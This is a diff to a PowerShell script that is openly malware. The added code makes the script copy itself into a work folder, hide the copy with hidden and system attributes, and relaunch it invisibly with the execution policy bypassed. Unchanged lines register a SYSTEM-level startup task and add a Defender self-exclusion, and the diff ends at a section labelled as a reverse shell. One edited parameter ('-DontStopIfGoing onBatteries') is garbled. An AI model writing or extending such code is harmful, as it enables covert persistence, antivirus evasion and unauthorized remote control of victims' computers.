@@ -23,10 +23,27 @@ if (-not (Test-Path $WorkDir)) {
     New-Item -Path $WorkDir -ItemType Directory -Force | Out-Null
 }
 
-# SELF-COPY: The persistence task needs the file to exist at $FullPath
+# SELF-REPLICATION & INSTALLATION
+# If we are NOT running from the WorkDir, install ourselves there and launch the hidden version
 if ($PSCommandPath -and ($PSCommandPath -ne $FullPath)) {
-    Log-Debug "Copying script to $FullPath for persistence..."
-    Copy-Item -Path $PSCommandPath -Destination $FullPath -Force
+    Log-Debug "Current location ($PSCommandPath) is not the target ($FullPath)."
+    Log-Debug "Replicating script to $FullPath..."
+    try {
+        Copy-Item -Path $PSCommandPath -Destination $FullPath -Force -ErrorAction Stop
+        Log-Debug "Self-copy successful."
+        
+        # Hide the newly created file immediately
+        if (-not $DebugMode) {
+            attrib +h +s $FullPath
+        }
+
+        # If we are running manually, we trigger the persistent version and exit this one
+        Log-Debug "Handing off execution to the persistent copy..."
+        Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$FullPath`""
+        exit
+    } catch {
+        Log-Debug "Failed to replicate: $($_.Exception.Message)"
+    }
 }
 
 # Add self-exclusion to Microsoft Defender
@@ -58,23 +75,13 @@ try {
         
         $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $Arg
         $Trigger = New-ScheduledTaskTrigger -AtStartup
-        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoing onBatteries
         Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -User "SYSTEM" -RunLevel Highest -ErrorAction SilentlyContinue
     } else {
         Log-Debug "Persistence task already registered."
     }
 } catch {
     Log-Debug "Failed to register scheduled task."
-}
-
-# Hide the file (Only if not in debug mode)
-if (Test-Path $FullPath) {
-    if (-not $DebugMode) {
-        Log-Debug "Hiding file with system attributes."
-        attrib +h +s $FullPath
-    } else {
-        Log-Debug "Skipping file hiding (Debug Mode)."
-    }
 }
 
 # 2. THE ENGINE (The Reverse Shell)
